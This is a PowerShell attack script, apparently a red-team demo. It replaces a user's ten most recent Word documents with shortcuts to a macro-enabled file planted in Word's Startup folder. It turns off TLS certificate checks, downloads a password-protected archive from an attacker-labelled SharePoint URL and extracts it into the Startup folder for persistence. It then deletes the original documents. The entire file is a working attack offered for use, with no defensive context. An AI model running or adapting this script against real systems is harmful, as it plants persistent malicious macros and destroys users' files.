$TopFiles = Get-ChildItem -Recurse C:\Users\$env:USERNAME\Documents\TEST\ -filter "*.docx" | sort LastWriteTime -Descending | select FullName | select -First 10
$Files = $TopFiles.FullName
$LNK = $TopFiles.FullName -replace "docx","lnk"
foreach ($file in $LNK) 
	{
		$Shell = New-Object -ComObject ("WScript.Shell")
		$ShortCut = $Shell.CreateShortcut($file)
		$ShortCut.TargetPath=$env:USERPROFILE + "\AppData\Roaming\Microsoft\Word\Startup\Totally-Legitimate-Document.docm"
		$ShortCut.Save()
		sleep 1
	}
$LocalDir = Convert-Path .
$RemoteArchive = $LocalDir + "\Latest-Forms.7z"
$ExtractPath = Join-Path -Path $env:USERPROFILE -ChildPath "\AppData\Roaming\Microsoft\Word\Startup\"
$Url = "https://eviler-my.sharepoint.com/personal/badguy_eviler_onmicrosoft_com/_layouts/15/download.aspx?docid=1432aadf08ea24739b1f6e036dfa554a7&authkey=ATdXKOSTNmKkZ6E4a2pJ3Us"
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$webClient = new-object System.Net.WebClient
$webClient.DownloadFile( $Url, $RemoteArchive )
sleep 2
set-alias 7z "C:\Program Files\7-Zip\7z.exe"
7z e .\Latest-Forms.7z -pBlackHat2017-Password12345 -oC:\Users\$env:USERNAME\APPData\Roaming\Microsoft\Word\Startup\
Remove-Item -path $RemoteArchive
foreach ($file in $Files) 
	{
	Remove-Item -path $file
	}
	
Exit
